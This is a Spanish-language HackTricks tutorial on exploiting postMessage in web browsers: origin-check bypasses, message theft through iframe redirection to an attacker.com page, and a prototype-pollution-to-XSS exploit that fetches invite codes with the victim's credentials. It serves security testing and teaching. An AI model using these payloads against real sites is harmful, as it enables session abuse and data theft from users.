# Vulnerabilidades de PostMessage

## Vulnerabilidades de PostMessage

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) es un motor de b√∫squeda alimentado por la **dark web** que ofrece funcionalidades **gratuitas** para verificar si una empresa o sus clientes han sido **comprometidos** por **malwares de robo**.

El objetivo principal de WhiteIntel es combatir los secuestros de cuentas y los ataques de ransomware resultantes de malwares que roban informaci√≥n.

Puedes visitar su sitio web y probar su motor de forma **gratuita** en:

{% embed url="https://whiteintel.io" %}

***

## Enviar **PostMessage**

**PostMessage** utiliza la siguiente funci√≥n para enviar un mensaje:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Ten en cuenta que **targetOrigin** puede ser un '\*' o una URL como _https://company.com._\
En el **segundo escenario**, el **mensaje solo puede ser enviado a ese dominio** (incluso si el origen del objeto ventana es diferente).\
Si se utiliza el **comod√≠n**, los **mensajes podr√≠an ser enviados a cualquier dominio**, y se enviar√°n al origen del objeto Window.

### Atacando iframe y comod√≠n en **targetOrigin**

Como se explica en [**este informe**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si encuentras una p√°gina que puede ser **iframed** (sin protecci√≥n de `X-Frame-Header`) y que est√° **enviando mensajes sensibles** a trav√©s de **postMessage** utilizando un **comod√≠n** (\*), puedes **modificar** el **origen** del **iframe** y **filtrar** el **mensaje sensible** a un dominio controlado por ti.\
Ten en cuenta que si la p√°gina puede ser iframed pero el **targetOrigin** est√° **configurado con una URL y no con un comod√≠n**, este **truco no funcionar√°**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Explotaci√≥n de addEventListener

**`addEventListener`** es la funci√≥n utilizada por JS para declarar la funci√≥n que est√° **esperando `postMessages`**.\
Se utilizar√° un c√≥digo similar al siguiente:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
### Enumeraci√≥n

Para **encontrar escuchas de eventos** en la p√°gina actual puedes:

* **Buscar** en el c√≥digo JS `window.addEventListener` y `$(window).on` (_versi√≥n JQuery_)
* **Ejecutar** en la consola de herramientas para desarrolladores: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Ir a** _Elements --> Event Listeners_ en las herramientas para desarrolladores del navegador

![](<../../.gitbook/assets/image (396).png>)

* Utilizar una **extensi√≥n del navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Estas extensiones del navegador **interceptar√°n todos los mensajes** y te los mostrar√°n.

### Saltos de verificaci√≥n de origen

* El atributo **`event.isTrusted`** se considera seguro ya que devuelve `True` solo para eventos generados por acciones genuinas del usuario. Aunque es desafiante de evadir si se implementa correctamente, su importancia en las verificaciones de seguridad es notable.
* El uso de **`indexOf()`** para la validaci√≥n de origen en eventos de PostMessage puede ser susceptible a evasiones. Un ejemplo que ilustra esta vulnerabilidad es:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* El m√©todo **`search()`** de `String.prototype.search()` est√° destinado a expresiones regulares, no a cadenas. Pasar cualquier cosa que no sea una expresi√≥n regular conduce a una conversi√≥n impl√≠cita a regex, lo que hace que el m√©todo sea potencialmente inseguro. Esto se debe a que en regex, un punto (.) act√∫a como comod√≠n, permitiendo evadir la validaci√≥n con dominios especialmente dise√±ados. Por ejemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* La funci√≥n **`match()`**, similar a `search()`, procesa regex. Si el regex est√° estructurado incorrectamente, podr√≠a ser propenso a evasiones.
* La funci√≥n **`escapeHtml`** est√° destinada a sanear las entradas escapando caracteres. Sin embargo, no crea un nuevo objeto escapado, sino que sobrescribe las propiedades del objeto existente. Este comportamiento puede ser explotado. En particular, si un objeto puede ser manipulado de manera que su propiedad controlada no reconozca `hasOwnProperty`, el `escapeHtml` no funcionar√° como se espera. Esto se demuestra en los ejemplos a continuaci√≥n:

* Fallo esperado:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
* Evasi√≥n del escape:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

En el contexto de esta vulnerabilidad, el objeto `File` es notablemente explotable debido a su propiedad de solo lectura `name`. Esta propiedad, cuando se utiliza en plantillas, no es saneada por la funci√≥n `escapeHtml`, lo que conlleva riesgos de seguridad potenciales.
* La propiedad `document.domain` en JavaScript puede ser establecida por un script para acortar el dominio, lo que permite una aplicaci√≥n m√°s relajada de la pol√≠tica de misma procedencia dentro del mismo dominio principal.

### Bypass de `e.origin == window.origin`

Al incrustar una p√°gina web dentro de un **iframe con sandbox** utilizando %%%%%%, es crucial entender que el origen del iframe se establecer√° en null. Esto es particularmente importante al tratar con **atributos de sandbox** y sus implicaciones en seguridad y funcionalidad.

Al especificar **`allow-popups`** en el atributo sandbox, cualquier ventana emergente abierta desde el iframe hereda las restricciones de sandbox de su padre. Esto significa que a menos que tambi√©n se incluya el atributo **`allow-popups-to-escape-sandbox`**, el origen de la ventana emergente tambi√©n se establece en `null`, aline√°ndose con el origen del iframe.

Consecuentemente, cuando se abre una ventana emergente bajo estas condiciones y se env√≠a un mensaje desde el iframe a la ventana emergente usando **`postMessage`**, tanto el origen de env√≠o como el de recepci√≥n se establecen en `null`. Esta situaci√≥n lleva a un escenario donde **`e.origin == window.origin`** se eval√∫a como verdadero (`null == null`), porque tanto el iframe como la ventana emergente comparten el mismo valor de origen `null`.

Para m√°s informaci√≥n **lee**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Evadiendo `e.source`

Es posible verificar si el mensaje proviene de la misma ventana en la que el script est√° escuchando (especialmente interesante para **Scripts de Contenido de extensiones de navegador** para verificar si el mensaje fue enviado desde la misma p√°gina):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Puedes forzar que **`e.source`** de un mensaje sea nulo creando un **iframe** que **env√≠e** el **postMessage** y sea **eliminado inmediatamente**.

Para obtener m√°s informaci√≥n, **lee:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypass de encabezado X-Frame

Para realizar estos ataques idealmente podr√°s **colocar la p√°gina web v√≠ctima** dentro de un `iframe`. Pero algunos encabezados como `X-Frame-Header` pueden **prevenir** ese **comportamiento**.\
En esos escenarios, a√∫n puedes usar un ataque menos sigiloso. Puedes abrir una nueva pesta√±a en la aplicaci√≥n web vulnerable y comunicarte con ella:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Robo de mensaje enviado al hijo bloqueando la p√°gina principal

En la siguiente p√°gina puedes ver c√≥mo podr√≠as robar datos de **postmessage sensibles** enviados a un **iframe hijo** al **bloquear** la **p√°gina principal** antes de enviar los datos y abusar de un **XSS en el hijo** para **filtrar los datos** antes de que sean recibidos:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Robo de mensaje modificando la ubicaci√≥n del iframe

Si puedes insertar un iframe en una p√°gina web sin X-Frame-Header que contenga otro iframe, puedes **cambiar la ubicaci√≥n de ese iframe hijo**, por lo que si est√° recibiendo un **postmessage** enviado usando un **comod√≠n**, un atacante podr√≠a **cambiar** el **origen** de ese iframe a una p√°gina **controlada** por √©l y **robar** el mensaje:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage a la Poluci√≥n de Prototipos y/o XSS

En escenarios donde los datos enviados a trav√©s de `postMessage` son ejecutados por JS, puedes **insertar un iframe** en la **p√°gina** y **explotar** la **poluci√≥n de prototipos/XSS** enviando el exploit a trav√©s de `postMessage`.

Un par de **XSS muy bien explicados a trav√©s de `postMessage`** se pueden encontrar en [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Ejemplo de un exploit para abusar de la **Poluci√≥n de Prototipos y luego XSS** a trav√©s de un `postMessage` a un `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Para **m√°s informaci√≥n**:

* Enlace a la p√°gina sobre [**contaminaci√≥n de prototipos**](../deserialization/nodejs-proto-prototype-pollution/)
* Enlace a la p√°gina sobre [**XSS**](../xss-cross-site-scripting/)
* Enlace a la p√°gina sobre [**contaminaci√≥n de prototipos en el lado del cliente a XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referencias

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Para practicar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) es un motor de b√∫squeda alimentado por la **dark web** que ofrece funcionalidades **gratuitas** para verificar si una empresa o sus clientes han sido **comprometidos** por **malwares de robo**.

El objetivo principal de WhiteIntel es combatir los secuestros de cuentas y los ataques de ransomware resultantes de malwares que roban informaci√≥n.

Puedes visitar su sitio web y probar su motor de forma **gratuita** en:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**productos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
